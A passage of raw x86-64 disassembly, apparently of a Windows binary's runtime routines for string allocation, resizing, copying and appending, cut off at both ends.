    6d8c3bdd:	48 89 d9             	mov    %rbx,%rcx
    6d8c3be0:	48 39 83 78 2b 00 00 	cmp    %rax,0x2b78(%rbx)
    6d8c3be7:	48 0f 4d 83 78 2b 00 	cmovge 0x2b78(%rbx),%rax
    6d8c3bee:	00 
    6d8c3bef:	48 ff 83 58 2b 00 00 	incq   0x2b58(%rbx)
    6d8c3bf6:	48 89 83 78 2b 00 00 	mov    %rax,0x2b78(%rbx)
    6d8c3bfd:	e8 f0 fb ff ff       	call   0x6d8c37f2
    6d8c3c02:	84 c0                	test   %al,%al
    6d8c3c04:	74 4f                	je     0x6d8c3c55
    6d8c3c06:	48 8b 83 00 21 00 00 	mov    0x2100(%rbx),%rax
    6d8c3c0d:	48 39 43 08          	cmp    %rax,0x8(%rbx)
    6d8c3c11:	7f 42                	jg     0x6d8c3c55
    6d8c3c13:	48 89 d9             	mov    %rbx,%rcx
    6d8c3c16:	e8 c9 fe ff ff       	call   0x6d8c3ae4
    6d8c3c1b:	48 8b 05 9e 2c 10 00 	mov    0x102c9e(%rip),%rax        # 0x6d9c68c0
    6d8c3c22:	ba 00 00 40 00       	mov    $0x400000,%edx
    6d8c3c27:	48 ff 83 60 2b 00 00 	incq   0x2b60(%rbx)
    6d8c3c2e:	48 01 c0             	add    %rax,%rax
    6d8c3c31:	48 3d 00 00 40 00    	cmp    $0x400000,%rax
    6d8c3c37:	48 0f 4c c2          	cmovl  %rdx,%rax
    6d8c3c3b:	48 39 83 68 2b 00 00 	cmp    %rax,0x2b68(%rbx)
    6d8c3c42:	48 89 43 08          	mov    %rax,0x8(%rbx)
    6d8c3c46:	48 0f 4d 83 68 2b 00 	cmovge 0x2b68(%rbx),%rax
    6d8c3c4d:	00 
    6d8c3c4e:	48 89 83 68 2b 00 00 	mov    %rax,0x2b68(%rbx)
    6d8c3c55:	48 89 d9             	mov    %rbx,%rcx
    6d8c3c58:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3c5c:	5b                   	pop    %rbx
    6d8c3c5d:	e9 ef fe ff ff       	jmp    0x6d8c3b51
    6d8c3c62:	53                   	push   %rbx
    6d8c3c63:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c3c67:	48 8b 41 18          	mov    0x18(%rcx),%rax
    6d8c3c6b:	48 39 41 10          	cmp    %rax,0x10(%rcx)
    6d8c3c6f:	48 89 cb             	mov    %rcx,%rbx
    6d8c3c72:	7e 0d                	jle    0x6d8c3c81
    6d8c3c74:	48 8b 81 00 21 00 00 	mov    0x2100(%rcx),%rax
    6d8c3c7b:	48 39 41 08          	cmp    %rax,0x8(%rcx)
    6d8c3c7f:	7f 29                	jg     0x6d8c3caa
    6d8c3c81:	48 83 7b 60 00       	cmpq   $0x0,0x60(%rbx)
    6d8c3c86:	75 22                	jne    0x6d8c3caa
    6d8c3c88:	48 89 d9             	mov    %rbx,%rcx
    6d8c3c8b:	e8 ff fe ff ff       	call   0x6d8c3b8f
    6d8c3c90:	48 8b 43 18          	mov    0x18(%rbx),%rax
    6d8c3c94:	ba f4 01 00 00       	mov    $0x1f4,%edx
    6d8c3c99:	48 01 c0             	add    %rax,%rax
    6d8c3c9c:	48 3d f4 01 00 00    	cmp    $0x1f4,%rax
    6d8c3ca2:	48 0f 4c c2          	cmovl  %rdx,%rax
    6d8c3ca6:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8c3caa:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3cae:	5b                   	pop    %rbx
    6d8c3caf:	c3                   	ret
    6d8c3cb0:	57                   	push   %rdi
    6d8c3cb1:	56                   	push   %rsi
    6d8c3cb2:	53                   	push   %rbx
    6d8c3cb3:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c3cb7:	4c 89 c6             	mov    %r8,%rsi
    6d8c3cba:	48 89 d3             	mov    %rdx,%rbx
    6d8c3cbd:	48 89 cf             	mov    %rcx,%rdi
    6d8c3cc0:	4c 89 c1             	mov    %r8,%rcx
    6d8c3cc3:	e8 9a ff ff ff       	call   0x6d8c3c62
    6d8c3cc8:	48 8d 53 10          	lea    0x10(%rbx),%rdx
    6d8c3ccc:	48 8d 4e 68          	lea    0x68(%rsi),%rcx
    6d8c3cd0:	e8 21 e8 ff ff       	call   0x6d8c24f6
    6d8c3cd5:	48 8b 56 28          	mov    0x28(%rsi),%rdx
    6d8c3cd9:	48 89 c3             	mov    %rax,%rbx
    6d8c3cdc:	48 89 78 08          	mov    %rdi,0x8(%rax)
    6d8c3ce0:	48 c7 00 04 00 00 00 	movq   $0x4,(%rax)
    6d8c3ce7:	48 8b 46 18          	mov    0x18(%rsi),%rax
    6d8c3ceb:	48 83 f8 08          	cmp    $0x8,%rax
    6d8c3cef:	7f 10                	jg     0x6d8c3d01
    6d8c3cf1:	48 89 1c c2          	mov    %rbx,(%rdx,%rax,8)
    6d8c3cf5:	48 ff c0             	inc    %rax
    6d8c3cf8:	48 89 46 18          	mov    %rax,0x18(%rsi)
    6d8c3cfc:	e9 b4 00 00 00       	jmp    0x6d8c3db5
    6d8c3d01:	48 c1 e0 03          	shl    $0x3,%rax
    6d8c3d05:	4c 8d 44 02 f8       	lea    -0x8(%rdx,%rax,1),%r8
    6d8c3d0a:	4d 8b 08             	mov    (%r8),%r9
    6d8c3d0d:	49 8b 09             	mov    (%r9),%rcx
    6d8c3d10:	48 83 f9 07          	cmp    $0x7,%rcx
    6d8c3d14:	0f 87 85 00 00 00    	ja     0x6d8c3d9f
    6d8c3d1a:	4c 8d 44 02 f0       	lea    -0x10(%rdx,%rax,1),%r8
    6d8c3d1f:	4d 8b 08             	mov    (%r8),%r9
    6d8c3d22:	49 8b 09             	mov    (%r9),%rcx
    6d8c3d25:	48 83 f9 07          	cmp    $0x7,%rcx
    6d8c3d29:	77 74                	ja     0x6d8c3d9f
    6d8c3d2b:	4c 8d 44 02 e8       	lea    -0x18(%rdx,%rax,1),%r8
    6d8c3d30:	4d 8b 08             	mov    (%r8),%r9
    6d8c3d33:	49 8b 09             	mov    (%r9),%rcx
    6d8c3d36:	48 83 f9 07          	cmp    $0x7,%rcx
    6d8c3d3a:	77 63                	ja     0x6d8c3d9f
    6d8c3d3c:	4c 8d 44 02 e0       	lea    -0x20(%rdx,%rax,1),%r8
    6d8c3d41:	4d 8b 08             	mov    (%r8),%r9
    6d8c3d44:	49 8b 09             	mov    (%r9),%rcx
    6d8c3d47:	48 83 f9 07          	cmp    $0x7,%rcx
    6d8c3d4b:	77 52                	ja     0x6d8c3d9f
    6d8c3d4d:	4c 8d 44 02 d8       	lea    -0x28(%rdx,%rax,1),%r8
    6d8c3d52:	4d 8b 08             	mov    (%r8),%r9
    6d8c3d55:	49 8b 09             	mov    (%r9),%rcx
    6d8c3d58:	48 83 f9 07          	cmp    $0x7,%rcx
    6d8c3d5c:	77 41                	ja     0x6d8c3d9f
    6d8c3d5e:	4c 8d 44 02 d0       	lea    -0x30(%rdx,%rax,1),%r8
    6d8c3d63:	4d 8b 08             	mov    (%r8),%r9
    6d8c3d66:	49 8b 09             	mov    (%r9),%rcx
    6d8c3d69:	48 83 f9 07          	cmp    $0x7,%rcx
    6d8c3d6d:	77 30                	ja     0x6d8c3d9f
    6d8c3d6f:	4c 8d 44 02 c8       	lea    -0x38(%rdx,%rax,1),%r8
    6d8c3d74:	4d 8b 08             	mov    (%r8),%r9
    6d8c3d77:	49 8b 09             	mov    (%r9),%rcx
    6d8c3d7a:	48 83 f9 07          	cmp    $0x7,%rcx
    6d8c3d7e:	77 1f                	ja     0x6d8c3d9f
    6d8c3d80:	48 8d 54 02 c0       	lea    -0x40(%rdx,%rax,1),%rdx
    6d8c3d85:	48 8b 0a             	mov    (%rdx),%rcx
    6d8c3d88:	48 8b 01             	mov    (%rcx),%rax
    6d8c3d8b:	48 83 f8 07          	cmp    $0x7,%rax
    6d8c3d8f:	77 1a                	ja     0x6d8c3dab
    6d8c3d91:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
    6d8c3d95:	48 89 da             	mov    %rbx,%rdx
    6d8c3d98:	e8 50 ef ff ff       	call   0x6d8c2ced
    6d8c3d9d:	eb 16                	jmp    0x6d8c3db5
    6d8c3d9f:	48 83 e1 fb          	and    $0xfffffffffffffffb,%rcx
    6d8c3da3:	49 89 09             	mov    %rcx,(%r9)
    6d8c3da6:	49 89 18             	mov    %rbx,(%r8)
    6d8c3da9:	eb 0a                	jmp    0x6d8c3db5
    6d8c3dab:	48 83 e0 fb          	and    $0xfffffffffffffffb,%rax
    6d8c3daf:	48 89 01             	mov    %rax,(%rcx)
    6d8c3db2:	48 89 1a             	mov    %rbx,(%rdx)
    6d8c3db5:	48 8d 43 10          	lea    0x10(%rbx),%rax
    6d8c3db9:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3dbd:	5b                   	pop    %rbx
    6d8c3dbe:	5e                   	pop    %rsi
    6d8c3dbf:	5f                   	pop    %rdi
    6d8c3dc0:	c3                   	ret
    6d8c3dc1:	4c 8d 05 f8 09 10 00 	lea    0x1009f8(%rip),%r8        # 0x6d9c47c0
    6d8c3dc8:	e9 e3 fe ff ff       	jmp    0x6d8c3cb0
    6d8c3dcd:	53                   	push   %rbx
    6d8c3dce:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c3dd2:	bb 07 00 00 00       	mov    $0x7,%ebx
    6d8c3dd7:	48 83 f9 07          	cmp    $0x7,%rcx
    6d8c3ddb:	48 0f 4d d9          	cmovge %rcx,%rbx
    6d8c3ddf:	48 8d 0d 1a b2 00 00 	lea    0xb21a(%rip),%rcx        # 0x6d8cf000
    6d8c3de6:	48 8d 53 11          	lea    0x11(%rbx),%rdx
    6d8c3dea:	e8 d2 ff ff ff       	call   0x6d8c3dc1
    6d8c3def:	48 89 58 08          	mov    %rbx,0x8(%rax)
    6d8c3df3:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    6d8c3dfa:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3dfe:	5b                   	pop    %rbx
    6d8c3dff:	c3                   	ret
    6d8c3e00:	57                   	push   %rdi
    6d8c3e01:	56                   	push   %rsi
    6d8c3e02:	53                   	push   %rbx
    6d8c3e03:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c3e07:	48 89 ce             	mov    %rcx,%rsi
    6d8c3e0a:	48 89 d1             	mov    %rdx,%rcx
    6d8c3e0d:	48 89 d3             	mov    %rdx,%rbx
    6d8c3e10:	e8 b8 ff ff ff       	call   0x6d8c3dcd
    6d8c3e15:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
    6d8c3e19:	48 8d 50 10          	lea    0x10(%rax),%rdx
    6d8c3e1d:	48 89 18             	mov    %rbx,(%rax)
    6d8c3e20:	48 89 d7             	mov    %rdx,%rdi
    6d8c3e23:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c3e25:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3e29:	5b                   	pop    %rbx
    6d8c3e2a:	5e                   	pop    %rsi
    6d8c3e2b:	5f                   	pop    %rdi
    6d8c3e2c:	c3                   	ret
    6d8c3e2d:	57                   	push   %rdi
    6d8c3e2e:	48 85 c9             	test   %rcx,%rcx
    6d8c3e31:	49 89 c8             	mov    %rcx,%r8
    6d8c3e34:	74 1b                	je     0x6d8c3e51
    6d8c3e36:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    6d8c3e3a:	31 c0                	xor    %eax,%eax
    6d8c3e3c:	4c 89 c7             	mov    %r8,%rdi
    6d8c3e3f:	f2 ae                	repnz scas (%rdi),%al
    6d8c3e41:	48 89 ca             	mov    %rcx,%rdx
    6d8c3e44:	4c 89 c1             	mov    %r8,%rcx
    6d8c3e47:	48 f7 d2             	not    %rdx
    6d8c3e4a:	48 8d 52 ff          	lea    -0x1(%rdx),%rdx
    6d8c3e4e:	5f                   	pop    %rdi
    6d8c3e4f:	eb af                	jmp    0x6d8c3e00
    6d8c3e51:	31 c0                	xor    %eax,%eax
    6d8c3e53:	5f                   	pop    %rdi
    6d8c3e54:	c3                   	ret
    6d8c3e55:	53                   	push   %rbx
    6d8c3e56:	48 83 ec 30          	sub    $0x30,%rsp
    6d8c3e5a:	4c 8d 05 5f 09 10 00 	lea    0x10095f(%rip),%r8        # 0x6d9c47c0
    6d8c3e61:	48 89 d3             	mov    %rdx,%rbx
    6d8c3e64:	e8 47 fe ff ff       	call   0x6d8c3cb0
    6d8c3e69:	48 89 da             	mov    %rbx,%rdx
    6d8c3e6c:	48 89 c1             	mov    %rax,%rcx
    6d8c3e6f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c3e74:	e8 d5 dd ff ff       	call   0x6d8c1c4e
    6d8c3e79:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    6d8c3e7e:	48 83 c4 30          	add    $0x30,%rsp
    6d8c3e82:	5b                   	pop    %rbx
    6d8c3e83:	c3                   	ret
    6d8c3e84:	56                   	push   %rsi
    6d8c3e85:	53                   	push   %rbx
    6d8c3e86:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3e8a:	48 89 d3             	mov    %rdx,%rbx
    6d8c3e8d:	48 89 ce             	mov    %rcx,%rsi
    6d8c3e90:	48 8d 0d 29 09 10 00 	lea    0x100929(%rip),%rcx        # 0x6d9c47c0
    6d8c3e97:	e8 c6 fd ff ff       	call   0x6d8c3c62
    6d8c3e9c:	48 8d 53 10          	lea    0x10(%rbx),%rdx
    6d8c3ea0:	48 8d 0d 81 09 10 00 	lea    0x100981(%rip),%rcx        # 0x6d9c4828
    6d8c3ea7:	e8 4a e6 ff ff       	call   0x6d8c24f6
    6d8c3eac:	48 89 da             	mov    %rbx,%rdx
    6d8c3eaf:	4c 8d 48 10          	lea    0x10(%rax),%r9
    6d8c3eb3:	48 89 70 08          	mov    %rsi,0x8(%rax)
    6d8c3eb7:	48 c7 00 08 00 00 00 	movq   $0x8,(%rax)
    6d8c3ebe:	4c 89 c9             	mov    %r9,%rcx
    6d8c3ec1:	e8 88 dd ff ff       	call   0x6d8c1c4e
    6d8c3ec6:	4c 89 c8             	mov    %r9,%rax
    6d8c3ec9:	48 83 c4 28          	add    $0x28,%rsp
    6d8c3ecd:	5b                   	pop    %rbx
    6d8c3ece:	5e                   	pop    %rsi
    6d8c3ecf:	c3                   	ret
    6d8c3ed0:	57                   	push   %rdi
    6d8c3ed1:	56                   	push   %rsi
    6d8c3ed2:	53                   	push   %rbx
    6d8c3ed3:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c3ed7:	48 85 c9             	test   %rcx,%rcx
    6d8c3eda:	48 89 ce             	mov    %rcx,%rsi
    6d8c3edd:	74 51                	je     0x6d8c3f30
    6d8c3edf:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
    6d8c3ee4:	78 45                	js     0x6d8c3f2b
    6d8c3ee6:	48 8b 19             	mov    (%rcx),%rbx
    6d8c3ee9:	48 8d 0d 10 b1 00 00 	lea    0xb110(%rip),%rcx        # 0x6d8cf000
    6d8c3ef0:	b8 07 00 00 00       	mov    $0x7,%eax
    6d8c3ef5:	48 83 fb 07          	cmp    $0x7,%rbx
    6d8c3ef9:	48 0f 4c d8          	cmovl  %rax,%rbx
    6d8c3efd:	48 83 c6 10          	add    $0x10,%rsi
    6d8c3f01:	48 8d 53 11          	lea    0x11(%rbx),%rdx
    6d8c3f05:	e8 7a ff ff ff       	call   0x6d8c3e84
    6d8c3f0a:	48 8b 56 f0          	mov    -0x10(%rsi),%rdx
    6d8c3f0e:	48 89 58 08          	mov    %rbx,0x8(%rax)
    6d8c3f12:	48 89 10             	mov    %rdx,(%rax)
    6d8c3f15:	48 8b 7e f0          	mov    -0x10(%rsi),%rdi
    6d8c3f19:	48 8d 50 10          	lea    0x10(%rax),%rdx
    6d8c3f1d:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
    6d8c3f21:	48 89 d7             	mov    %rdx,%rdi
    6d8c3f24:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c3f26:	48 89 c6             	mov    %rax,%rsi
    6d8c3f29:	eb 05                	jmp    0x6d8c3f30
    6d8c3f2b:	48 83 41 f0 08       	addq   $0x8,-0x10(%rcx)
    6d8c3f30:	48 89 f0             	mov    %rsi,%rax
    6d8c3f33:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3f37:	5b                   	pop    %rbx
    6d8c3f38:	5e                   	pop    %rsi
    6d8c3f39:	5f                   	pop    %rdi
    6d8c3f3a:	c3                   	ret
    6d8c3f3b:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3f3f:	49 89 c8             	mov    %rcx,%r8
    6d8c3f42:	b9 10 00 00 00       	mov    $0x10,%ecx
    6d8c3f47:	e8 5a f0 ff ff       	call   0x6d8c2fa6
    6d8c3f4c:	4c 01 c0             	add    %r8,%rax
    6d8c3f4f:	48 83 c4 28          	add    $0x28,%rsp
    6d8c3f53:	c3                   	ret
    6d8c3f54:	53                   	push   %rbx
    6d8c3f55:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c3f59:	bb 07 00 00 00       	mov    $0x7,%ebx
    6d8c3f5e:	48 83 f9 07          	cmp    $0x7,%rcx
    6d8c3f62:	48 0f 4d d9          	cmovge %rcx,%rbx
    6d8c3f66:	48 8d 0d 93 b0 00 00 	lea    0xb093(%rip),%rcx        # 0x6d8cf000
    6d8c3f6d:	48 8d 53 11          	lea    0x11(%rbx),%rdx
    6d8c3f71:	e8 df fe ff ff       	call   0x6d8c3e55
    6d8c3f76:	48 89 58 08          	mov    %rbx,0x8(%rax)
    6d8c3f7a:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    6d8c3f81:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3f85:	5b                   	pop    %rbx
    6d8c3f86:	c3                   	ret
    6d8c3f87:	57                   	push   %rdi
    6d8c3f88:	56                   	push   %rsi
    6d8c3f89:	53                   	push   %rbx
    6d8c3f8a:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c3f8e:	48 85 c9             	test   %rcx,%rcx
    6d8c3f91:	48 89 ce             	mov    %rcx,%rsi
    6d8c3f94:	74 4d                	je     0x6d8c3fe3
    6d8c3f96:	48 03 11             	add    (%rcx),%rdx
    6d8c3f99:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
    6d8c3fa0:	ff ff 3f 
    6d8c3fa3:	48 23 4e 08          	and    0x8(%rsi),%rcx
    6d8c3fa7:	48 89 d3             	mov    %rdx,%rbx
    6d8c3faa:	48 39 ca             	cmp    %rcx,%rdx
    6d8c3fad:	7e 43                	jle    0x6d8c3ff2
    6d8c3faf:	e8 1b dc ff ff       	call   0x6d8c1bcf
    6d8c3fb4:	48 39 c3             	cmp    %rax,%rbx
    6d8c3fb7:	48 0f 4c d8          	cmovl  %rax,%rbx
    6d8c3fbb:	48 83 c6 10          	add    $0x10,%rsi
    6d8c3fbf:	48 89 d9             	mov    %rbx,%rcx
    6d8c3fc2:	e8 06 fe ff ff       	call   0x6d8c3dcd
    6d8c3fc7:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
    6d8c3fcb:	48 8d 50 10          	lea    0x10(%rax),%rdx
    6d8c3fcf:	48 89 d7             	mov    %rdx,%rdi
    6d8c3fd2:	48 89 08             	mov    %rcx,(%rax)
    6d8c3fd5:	48 ff c1             	inc    %rcx
    6d8c3fd8:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c3fda:	48 89 58 08          	mov    %rbx,0x8(%rax)
    6d8c3fde:	48 89 c6             	mov    %rax,%rsi
    6d8c3fe1:	eb 0f                	jmp    0x6d8c3ff2
    6d8c3fe3:	48 89 d1             	mov    %rdx,%rcx
    6d8c3fe6:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3fea:	5b                   	pop    %rbx
    6d8c3feb:	5e                   	pop    %rsi
    6d8c3fec:	5f                   	pop    %rdi
    6d8c3fed:	e9 db fd ff ff       	jmp    0x6d8c3dcd
    6d8c3ff2:	48 89 f0             	mov    %rsi,%rax
    6d8c3ff5:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3ff9:	5b                   	pop    %rbx
    6d8c3ffa:	5e                   	pop    %rsi
    6d8c3ffb:	5f                   	pop    %rdi
    6d8c3ffc:	c3                   	ret
    6d8c3ffd:	55                   	push   %rbp
    6d8c3ffe:	57                   	push   %rdi
    6d8c3fff:	56                   	push   %rsi
    6d8c4000:	53                   	push   %rbx
    6d8c4001:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4005:	48 85 c9             	test   %rcx,%rcx
    6d8c4008:	48 89 ce             	mov    %rcx,%rsi
    6d8c400b:	89 d3                	mov    %edx,%ebx
    6d8c400d:	74 43                	je     0x6d8c4052
    6d8c400f:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
    6d8c4016:	ff ff 3f 
    6d8c4019:	48 23 4e 08          	and    0x8(%rsi),%rcx
    6d8c401d:	48 3b 0e             	cmp    (%rsi),%rcx
    6d8c4020:	7f 44                	jg     0x6d8c4066
    6d8c4022:	e8 a8 db ff ff       	call   0x6d8c1bcf
    6d8c4027:	48 83 c6 10          	add    $0x10,%rsi
    6d8c402b:	48 89 c1             	mov    %rax,%rcx
    6d8c402e:	48 89 c5             	mov    %rax,%rbp
    6d8c4031:	e8 97 fd ff ff       	call   0x6d8c3dcd
    6d8c4036:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
    6d8c403a:	48 8d 50 10          	lea    0x10(%rax),%rdx
    6d8c403e:	48 89 d7             	mov    %rdx,%rdi
    6d8c4041:	48 89 08             	mov    %rcx,(%rax)
    6d8c4044:	48 ff c1             	inc    %rcx
    6d8c4047:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c4049:	48 89 68 08          	mov    %rbp,0x8(%rax)
    6d8c404d:	48 89 c6             	mov    %rax,%rsi
    6d8c4050:	eb 14                	jmp    0x6d8c4066
    6d8c4052:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c4057:	e8 71 fd ff ff       	call   0x6d8c3dcd
    6d8c405c:	48 89 c6             	mov    %rax,%rsi
    6d8c405f:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    6d8c4066:	48 8b 06             	mov    (%rsi),%rax
    6d8c4069:	88 5c 06 10          	mov    %bl,0x10(%rsi,%rax,1)
    6d8c406d:	c6 44 06 11 00       	movb   $0x0,0x11(%rsi,%rax,1)
    6d8c4072:	48 ff c0             	inc    %rax
    6d8c4075:	48 89 06             	mov    %rax,(%rsi)
    6d8c4078:	48 89 f0             	mov    %rsi,%rax
    6d8c407b:	48 83 c4 28          	add    $0x28,%rsp
    6d8c407f:	5b                   	pop    %rbx
    6d8c4080:	5e                   	pop    %rsi
    6d8c4081:	5f                   	pop    %rdi
    6d8c4082:	5d                   	pop    %rbp
    6d8c4083:	c3                   	ret
    6d8c4084:	48 83 ec 18          	sub    $0x18,%rsp
    6d8c4088:	48 8b 15 31 07 10 00 	mov    0x100731(%rip),%rdx        # 0x6d9c47c0
    6d8c408f:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
    6d8c4094:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
    6d8c4099:	4c 8b 44 24 08       	mov    0x8(%rsp),%r8
    6d8c409e:	31 c0                	xor    %eax,%eax
    6d8c40a0:	49 39 c8             	cmp    %rcx,%r8
    6d8c40a3:	77 06                	ja     0x6d8c40ab
    6d8c40a5:	48 39 ca             	cmp    %rcx,%rdx
    6d8c40a8:	0f 93 c0             	setae  %al
    6d8c40ab:	48 83 c4 18          	add    $0x18,%rsp
    6d8c40af:	c3                   	ret
    6d8c40b0:	56                   	push   %rsi
    6d8c40b1:	53                   	push   %rbx
    6d8c40b2:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c40b6:	48 89 ce             	mov    %rcx,%rsi
    6d8c40b9:	48 89 d3             	mov    %rdx,%rbx
    6d8c40bc:	e8 c3 ff ff ff       	call   0x6d8c4084
    6d8c40c1:	84 c0                	test   %al,%al
    6d8c40c3:	75 1f                	jne    0x6d8c40e4
    6d8c40c5:	48 85 db             	test   %rbx,%rbx
    6d8c40c8:	74 05                	je     0x6d8c40cf
    6d8c40ca:	48 83 43 f0 08       	addq   $0x8,-0x10(%rbx)
    6d8c40cf:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c40d2:	48 81 f9 ff 0f 00 00 	cmp    $0xfff,%rcx
    6d8c40d9:	76 09                	jbe    0x6d8c40e4
    6d8c40db:	48 83 e9 10          	sub    $0x10,%rcx
    6d8c40df:	e8 9b ec ff ff       	call   0x6d8c2d7f
    6d8c40e4:	48 89 1e             	mov    %rbx,(%rsi)
    6d8c40e7:	48 83 c4 28          	add    $0x28,%rsp
    6d8c40eb:	5b                   	pop    %rbx
    6d8c40ec:	5e                   	pop    %rsi
    6d8c40ed:	c3                   	ret
    6d8c40ee:	56                   	push   %rsi
    6d8c40ef:	53                   	push   %rbx
    6d8c40f0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c40f4:	48 85 d2             	test   %rdx,%rdx
    6d8c40f7:	48 89 ce             	mov    %rcx,%rsi
    6d8c40fa:	74 23                	je     0x6d8c411f
    6d8c40fc:	48 89 d3             	mov    %rdx,%rbx
    6d8c40ff:	48 ff c3             	inc    %rbx
    6d8c4102:	0f be 53 ff          	movsbl -0x1(%rbx),%edx
    6d8c4106:	84 d2                	test   %dl,%dl
    6d8c4108:	74 15                	je     0x6d8c411f
    6d8c410a:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c410d:	e8 eb fe ff ff       	call   0x6d8c3ffd
    6d8c4112:	48 89 f1             	mov    %rsi,%rcx
    6d8c4115:	48 89 c2             	mov    %rax,%rdx
    6d8c4118:	e8 93 ff ff ff       	call   0x6d8c40b0
    6d8c411d:	eb e0                	jmp    0x6d8c40ff
    6d8c411f:	48 83 c4 28          	add    $0x28,%rsp
    6d8c4123:	5b                   	pop    %rbx
    6d8c4124:	5e                   	pop    %rsi
    6d8c4125:	c3                   	ret
    6d8c4126:	53                   	push   %rbx
    6d8c4127:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c412b:	48 89 cb             	mov    %rcx,%rbx
    6d8c412e:	e8 21 fe ff ff       	call   0x6d8c3f54
    6d8c4133:	48 89 18             	mov    %rbx,(%rax)
    6d8c4136:	48 83 c4 20          	add    $0x20,%rsp
    6d8c413a:	5b                   	pop    %rbx
    6d8c413b:	c3                   	ret
    6d8c413c:	41 55                	push   %r13
    6d8c413e:	41 54                	push   %r12
    6d8c4140:	55                   	push   %rbp
    6d8c4141:	57                   	push   %rdi
    6d8c4142:	56                   	push   %rsi
    6d8c4143:	53                   	push   %rbx
    6d8c4144:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4148:	41 bc 00 00 00 00    	mov    $0x0,%r12d
    6d8c414e:	48 85 d2             	test   %rdx,%rdx
    6d8c4151:	48 89 cb             	mov    %rcx,%rbx
    6d8c4154:	48 89 d5             	mov    %rdx,%rbp
    6d8c4157:	4c 0f 49 e2          	cmovns %rdx,%r12
    6d8c415b:	48 85 c9             	test   %rcx,%rcx
    6d8c415e:	74 60                	je     0x6d8c41c0
    6d8c4160:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
    6d8c4167:	ff ff 3f 
    6d8c416a:	48 23 4b 08          	and    0x8(%rbx),%rcx
    6d8c416e:	4c 39 e1             	cmp    %r12,%rcx
    6d8c4171:	7d 58                	jge    0x6d8c41cb
    6d8c4173:	e8 57 da ff ff       	call   0x6d8c1bcf
    6d8c4178:	48 8d 73 10          	lea    0x10(%rbx),%rsi
    6d8c417c:	48 39 c5             	cmp    %rax,%rbp
    6d8c417f:	48 0f 4d c5          	cmovge %rbp,%rax
    6d8c4183:	48 89 c1             	mov    %rax,%rcx
    6d8c4186:	49 89 c5             	mov    %rax,%r13
    6d8c4189:	e8 3f fc ff ff       	call   0x6d8c3dcd
    6d8c418e:	48 8b 0b             	mov    (%rbx),%rcx
    6d8c4191:	48 89 ea             	mov    %rbp,%rdx
    6d8c4194:	49 89 c1             	mov    %rax,%r9
    6d8c4197:	48 8d 40 10          	lea    0x10(%rax),%rax
    6d8c419b:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
    6d8c419f:	48 89 c7             	mov    %rax,%rdi
    6d8c41a2:	48 ff c1             	inc    %rcx
    6d8c41a5:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c41a7:	48 8b 03             	mov    (%rbx),%rax
    6d8c41aa:	49 8d 4c 01 10       	lea    0x10(%r9,%rax,1),%rcx
    6d8c41af:	48 29 c2             	sub    %rax,%rdx
    6d8c41b2:	e8 97 da ff ff       	call   0x6d8c1c4e
    6d8c41b7:	4d 89 69 08          	mov    %r13,0x8(%r9)
    6d8c41bb:	4c 89 cb             	mov    %r9,%rbx
    6d8c41be:	eb 0b                	jmp    0x6d8c41cb
    6d8c41c0:	48 89 d1             	mov    %rdx,%rcx
    6d8c41c3:	e8 5e ff ff ff       	call   0x6d8c4126
    6d8c41c8:	48 89 c3             	mov    %rax,%rbx
    6d8c41cb:	48 89 d8             	mov    %rbx,%rax
    6d8c41ce:	4c 89 23             	mov    %r12,(%rbx)
    6d8c41d1:	42 c6 44 23 10 00    	movb   $0x0,0x10(%rbx,%r12,1)
    6d8c41d7:	48 83 c4 28          	add    $0x28,%rsp
    6d8c41db:	5b                   	pop    %rbx
    6d8c41dc:	5e                   	pop    %rsi
    6d8c41dd:	5f                   	pop    %rdi
    6d8c41de:	5d                   	pop    %rbp
    6d8c41df:	41 5c                	pop    %r12
    6d8c41e1:	41 5d                	pop    %r13
    6d8c41e3:	c3                   	ret
    6d8c41e4:	41 57                	push   %r15
    6d8c41e6:	41 56                	push   %r14
